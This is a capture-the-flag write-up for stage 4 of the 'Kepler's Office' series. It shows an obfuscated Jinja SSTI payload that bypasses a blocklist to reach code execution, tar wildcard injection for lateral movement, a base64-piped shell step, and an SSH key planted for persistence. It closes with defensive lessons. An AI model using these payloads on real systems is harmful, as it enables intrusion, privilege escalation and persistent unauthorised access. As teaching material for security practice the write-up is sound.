# Kepler's Office 4/5 — Root of the Matter

**Flag:** `reentry{t4r_w1ldc4rd_r0d3_kepl3rs_j0b}`

| | |
|---|---|
| Category | Lateral movement (svc → kepler) · SSTI→RCE + tar wildcard injection |
| Target | the office terminal instance (offline now) |
| Files | none |

> **Challenge brief:** Your code runs as the console's low-privilege service account. KEPLER's own
> files — and his override signer — belong to his user. Something of his still runs on the box and
> it may prove useful. Become kepler.

---

## Short version

1. Extend the stage-3 SSTI from file read to full **RCE** as `svc` (`os.popen`), bypassing the
   blocklist (`os`,`popen`,`import` assembled with `~`/`\x5f`).
2. `ps` shows a **kepler** process: `/bin/sh /opt/reelbackup/backup.sh` in a loop every 15 s.
3. The script does `cd /var/spool/reels && tar czf OUT *`, and `/var/spool/reels` is `drwxrwxrwt`
   (world-writable). Classic **tar wildcard injection** (GTFOBins).
4. Drop files whose names are tar options (`--checkpoint=1`,
   `--checkpoint-action=exec=sh runme.sh`) + `runme.sh`. kepler's tar runs `runme.sh` as kepler.
5. As kepler, read `flag4.txt` and install an SSH key for persistence.

---

## 1. From file read to RCE (SSTI)

`os`/`popen` are blocked, so assemble them at runtime (`~` = concatenation in Jinja) and build
`__import__` from `\x5f`:

```
{{ ((cycler|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5fglobals\x5f\x5f"))
   |attr("get")("\x5f\x5fbuiltins\x5f\x5f")|attr("get")("\x5f\x5fimp"~"ort\x5f\x5f"))
   ("o"~"s")|attr("po"~"pen")("<CMD>")|attr("read")() }}
```

A `run <cmd>` helper (fresh session, render id=3) like stage 3. Test: `run 'id'` →
`uid=1001(svc)`.

## 2. Recon — what runs as kepler

```bash
run 'ps -eo user,pid,cmd | grep -v grep'
```

```
svc     91  gunicorn ... --chdir /opt/admind --bind 127.0.0.1:1977     (the stage-2 archive node = svc)
svc     92  gunicorn ... --chdir /opt/console --bind 0.0.0.0:8000
kepler  93  /bin/sh /opt/reelbackup/backup.sh      <-- kepler's process
```

```sh
# backup.sh (runs as kepler, loop every 15 s)
SPOOL=/var/spool/reels
while true; do
  if [ -n "$(ls -A "$SPOOL")" ]; then
    cd "$SPOOL" && tar czf "$OUT" *      # <-- glob '*' = option injection
  fi
  sleep 15
done
```

`/var/spool/reels` is `drwxrwxrwt` (world-writable), so `svc` can drop files there.

## 3. Tar wildcard injection

Create files whose names tar reads as options (GTFOBins `tar`):

```sh
cd /var/spool/reels
cat > runme.sh <<'EOF'
{ id; cat /home/kepler/flag4.txt; } > /var/spool/reels/out.txt 2>&1
chmod 666 /var/spool/reels/out.txt
EOF
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh runme.sh'
```

> **Trap:** `exec` is on the SSTI blocklist, so you cannot type this setup directly in a template.
> Base64-encode the setup script (check the blob has no `os/exec/__/...`) and decode it on the
> target: `run "echo $B64|base64 -d|sh"`.

Within 15 s kepler's tar runs `sh runme.sh` as kepler:

```bash
run 'cat /var/spool/reels/out.txt'
# uid=1002(kepler) ...
# reentry{t4r_w1ldc4rd_r0d3_kepl3rs_j0b}
```

🚩 **Flag:** `reentry{t4r_w1ldc4rd_r0d3_kepl3rs_j0b}`

## 4. Persistence as kepler (for stage 5)

In `runme.sh`, add your key to `authorized_keys`:

```sh
mkdir -p /home/kepler/.ssh
echo 'ssh-ed25519 AAAA... pwn' >> /home/kepler/.ssh/authorized_keys
chmod 700 /home/kepler/.ssh; chmod 600 /home/kepler/.ssh/authorized_keys
```

`/home/kepler/NOTES.txt` points at stage 5: *"reel-seal diagnostics run as root via sealcheck
(SUID)..."*

> **Note:** The instance is offline now, so this cannot be re-run. The chain is self-consistent and
> continues into stage 5.

---

## Why it works / lessons

- `tar ... *` in an attacker-writable directory = RCE as the job's owner. Never use an unanchored
  `*` glob in commands (especially `tar`, `chown`, `chmod`); use `./` prefixes, `--`, or
  `find ... -exec`.
- A `drwxrwxrwt` directory shared between service accounts invites lateral movement.
- An SSTI denylist (`exec`) is bypassed with base64/dynamic assembly — another proof that denylists
  are not a security boundary.

> **Previous:** [3 - Diagnostics Report](3%20-%20Diagnostics%20Report.md) · **Next:** [5 - KEPLER's Signature](5%20-%20KEPLER%27s%20Signature.md)
